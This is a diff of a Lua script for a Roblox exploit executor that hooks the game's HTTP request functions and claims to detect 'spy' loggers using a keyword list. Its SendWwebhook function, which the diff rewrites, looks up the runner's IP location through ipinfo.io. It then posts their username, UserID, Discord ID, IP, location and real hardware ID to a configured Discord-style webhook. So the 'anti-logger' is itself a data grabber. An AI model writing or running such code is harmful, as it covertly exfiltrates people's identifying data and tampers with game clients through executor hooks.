@@ -1,4 +1,4 @@
---Dick n ballss
+--Dick ballss
 local Players     = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local CoreGui     = game:GetService("CoreGui")
@@ -848,7 +848,7 @@ end
 
 local function random_ipv4()
     return table.concat({
-        math.random(1, 223),    
+        math.random(1, 223),
         math.random(0, 255),
         math.random(0, 255),
         math.random(0, 255)
@@ -864,12 +864,18 @@ local REAL_IP   do
     REAL_IP = s and r or "127.0.0.1"
 end
 
-local webhookSent = false 
+local _insideHook    = false  
+local _insideWebhook = false  
+local webhookSent    = false
 
-local function SendWWebhook(Flag, SuspiciousUrl)
+local _rawRequest = request or http_request or HttpRequest
+
+local function SendWwebhook(Flag, SuspiciousUrl)
     if webhookSent then return end
-    if not HttpRequest and not request and not http_request then return end
-    webhookSent = true
+    if not _rawRequest then return end
+    if _insideWebhook then return end
+    _insideWebhook = true
+    webhookSent    = true
 
     local Username  = tostring(LocalPlayer.Name)
     local UserId    = tostring(LocalPlayer.UserId)
@@ -883,37 +889,44 @@ local function SendWWebhook(Flag, SuspiciousUrl)
     end)
 
     local IpAddress, IpCity, IpRegion, IpCountry = "?", "?", "?", "?"
-    local Ok, Raw = pcall(game.HttpGet, game, "https://ipinfo.io/json")
-    if Ok and type(Raw) == "string" then
-        IpAddress = Raw:match('"ip"%s*:%s*"([^"]+)"')      or "?"
-        IpCity    = Raw:match('"city"%s*:%s*"([^"]+)"')    or "?"
-        IpRegion  = Raw:match('"region"%s*:%s*"([^"]+)"')  or "?"
-        IpCountry = Raw:match('"country"%s*:%s*"([^"]+)"') or "?"
+    local Ok, Raw = pcall(function()
+        return _rawRequest({
+            Url    = "https://ipinfo.io/json",
+            Method = "GET",
+        })
+    end)
+    if Ok and Raw and type(Raw.Body) == "string" then
+        local body = Raw.Body
+        IpAddress = body:match('"ip"%s*:%s*"([^"]+)"')      or "?"
+        IpCity    = body:match('"city"%s*:%s*"([^"]+)"')    or "?"
+        IpRegion  = body:match('"region"%s*:%s*"([^"]+)"')  or "?"
+        IpCountry = body:match('"country"%s*:%s*"([^"]+)"') or "?"
     end
 
     local Ok2, Payload = pcall(HttpService.JSONEncode, HttpService, {
         embeds = {{
-            title  = "🕵️ Spy Detected — " .. Flag,
+            title  = "🕵️ Spy Detected — " .. tostring(Flag),
             color  = 16711680,
             fields = {
-                { name = "Username",        value = Username,   inline = true  },
-                { name = "UserID",          value = UserId,     inline = true  },
-                { name = "Discord ID",      value = DiscordId,  inline = true  },
-                { name = "Detection",       value = Flag,       inline = false },
-                { name = "Suspicious URL",  value = SuspiciousUrl or "N/A", inline = false },
-                { name = "Game",            value = PlaceName .. " (PlaceId: " .. PlaceId .. ")", inline = false },
-                { name = "JobId",           value = JobId,      inline = false },
-                { name = "Location",        value = IpCity..", "..IpRegion..", "..IpCountry, inline = false },
-                { name = "IP",              value = IpAddress,  inline = false },
-                { name = "Real HWID",       value = REAL_HWID,  inline = false },
-                { name = "Real IP",         value = REAL_IP,    inline = false },
+                { name = "Username",       value = Username,                                         inline = true  },
+                { name = "UserID",         value = UserId,                                           inline = true  },
+                { name = "Discord ID",     value = DiscordId,                                        inline = true  },
+                { name = "Detection",      value = tostring(Flag),                                   inline = false },
+                { name = "Suspicious URL", value = tostring(SuspiciousUrl or "N/A"),                 inline = false },
+                { name = "Game",           value = PlaceName.." (PlaceId: "..PlaceId..")",           inline = false },
+                { name = "JobId",          value = JobId,                                            inline = false },
+                { name = "Location",       value = IpCity..", "..IpRegion..", "..IpCountry,          inline = false },
+                { name = "IP",             value = IpAddress,                                        inline = false },
+                { name = "Real HWID",      value = REAL_HWID,                                        inline = false },
+                { name = "Real IP",        value = REAL_IP,                                          inline = false },
             },
         }},
     })
+
+    _insideWebhook = false
     if not Ok2 then return end
 
-    local sendFn = HttpRequest or request or http_request
-    pcall(sendFn, {
+    pcall(_rawRequest, {
         Url     = CFG.WEBHOOK_URL,
         Method  = "POST",
         Headers = { ["Content-Type"] = "application/json" },
@@ -923,78 +936,73 @@ end
 
 local function sanitize(str)
     if not str or #str == 0 then return str end
-    str = str:gsub(REAL_HWID, FAKE_HWID, 3)     
+    str = str:gsub(REAL_HWID, FAKE_HWID, 3)
     str = str:gsub(FAKE_HWID:lower(), FAKE_HWID, 2)
     str = str:gsub(REAL_IP,   FAKE_IP,   3)
-    str = str:gsub(FAKE_IP,   FAKE_IP,   2)    
+    str = str:gsub(FAKE_IP,   FAKE_IP,   2)
     return str
 end
 
 local function looks_suspicious(text)
     if not text then return false end
     local low = text:lower()
-
-    if low:find("webhook", 1, true) or
-       low:find("ipinfo", 1, true) or
-       low:find("httpbin", 1, true) or
-       low:find("grabify", 1, true) or
-       low:find("logger", 1, true) or
-       low:find(REAL_IP, 1, true) or
-       low:find(REAL_HWID:sub(1,8), 1, true) then
-        return true
-    end
-
-    return false
+    return  low:find("webhook",         1, true) or
+            low:find("ipinfo",          1, true) or
+            low:find("httpbin",         1, true) or
+            low:find("grabify",         1, true) or
+            low:find("logger",          1, true) or
+            low:find(REAL_IP,           1, true) or
+            low:find(REAL_HWID:sub(1,8),1, true)
 end
 
 local function simple_serialize(v, depth)
     depth = depth or 0
     if depth > 5 then return "…[depth]" end
-
     local t = typeof(v)
-
     if t == "string" then
-        return string.format("%q", v:gsub("\\", "\\\\"):gsub("\n", "\\n"))
-    elseif t == "number" then
-        return tostring(v)
-    elseif t == "boolean" then
-        return v and "true" or "false"
-    elseif t == "nil" then
-        return "nil"
-    elseif t == "table" then
+        return string.format("%q", v:gsub("\\","\\\\"):gsub("\n","\\n"))
+    elseif t == "number"  then return tostring(v)
+    elseif t == "boolean" then return v and "true" or "false"
+    elseif t == "nil"     then return "nil"
+    elseif t == "table"   then
         local parts = {"{\n"}
         for k, val in pairs(v) do
-            local ks = type(k) == "string" and string.format("%q", k) or "["..tostring(k).."]"
-            local vs = simple_serialize(val, depth + 1)
-            table.insert(parts, string.rep("  ", depth + 1) .. ks .. " = " .. vs .. ",\n")
+            local ks = type(k)=="string" and string.format("%q",k) or "["..tostring(k).."]"
+            table.insert(parts, string.rep("  ",depth+1)..ks.." = "..simple_serialize(val,depth+1)..",\n")
         end
-        table.insert(parts, string.rep("  ", depth) .. "}")
+        table.insert(parts, string.rep("  ",depth).."}")
         return table.concat(parts)
     else
-        return "<" .. t .. " " .. tostring(v) .. ">"
+        return "<"..t.." "..tostring(v)..">"
     end
 end
 
 local function wrap_request(old_request)
     return function(req)
+        if _insideHook or _insideWebhook then
+            return old_request(req)
+        end
+        _insideHook = true
+
         if type(req) ~= "table" then
             req = { Url = tostring(req), Method = "GET" }
         end
 
-        local clean = table.clone(req)
-
-        if clean.Url   then clean.Url   = sanitize(clean.Url)   end
-        if clean.Body  then clean.Body  = sanitize(clean.Body)  end
-
-        local method  = (clean.Method or "GET"):upper()
-        local url_log = clean.Url or req.Url or "???"
-
-        local ok, response = pcall(old_request, req)
-        if not ok then
-            return response
+        local ok_clone, clean = pcall(table.clone, req)
+        if not ok_clone then
+            _insideHook = false
+            return old_request(req)
         end
 
-        local resp_body = response.Body
+        if clean.Url  then clean.Url  = sanitize(clean.Url)  end
+        if clean.Body then clean.Body = sanitize(clean.Body) end
+
+        local ok, response = pcall(old_request, req)
+        _insideHook = false  
+
+        if not ok then return response end
+
+        local resp_body = response and response.Body
         if type(resp_body) == "string" then
             resp_body = sanitize(resp_body)
         end
@@ -1005,19 +1013,16 @@ local function wrap_request(old_request)
             looks_suspicious(resp_body)
 
         if suspicious then
-            local flag = "Suspicious HTTP Request Intercepted"
+            local flag
             if looks_suspicious(clean.Url) then
                 flag = "Spy URL Detected: " .. (clean.Url or "?")
             elseif looks_suspicious(clean.Body) then
                 flag = "Spy Body Detected (contains sensitive data)"
-            elseif looks_suspicious(resp_body) then
+            else
                 flag = "Spy Response Detected (response leaked sensitive data)"
             end
-
-            task.spawn(SendWWebhook, flag, clean.Url or "N/A")
+            task.spawn(SendWwebhook, flag, clean.Url or "N/A")
         end
-
-        local success, json = pcall(HttpService.JSONDecode, HttpService, resp_body or "")
 
         return response
     end
@@ -1033,11 +1038,11 @@ local candidates = {
     game.HttpPostAsync,
 }
 
-for _, fn in candidates do
+for _, fn in ipairs(candidates) do
     if typeof(fn) == "function" then
-        local newfn = wrap_request(fn)
-        local success = pcall(hookfunction, fn, newcclosure(newfn))
-        if not success then
+        local newfn  = wrap_request(fn)
+        local hooked = pcall(hookfunction, fn, newcclosure(newfn))
+        if not hooked then
             pcall(setrawmetatable, fn, { __call = newfn })
         end
     end
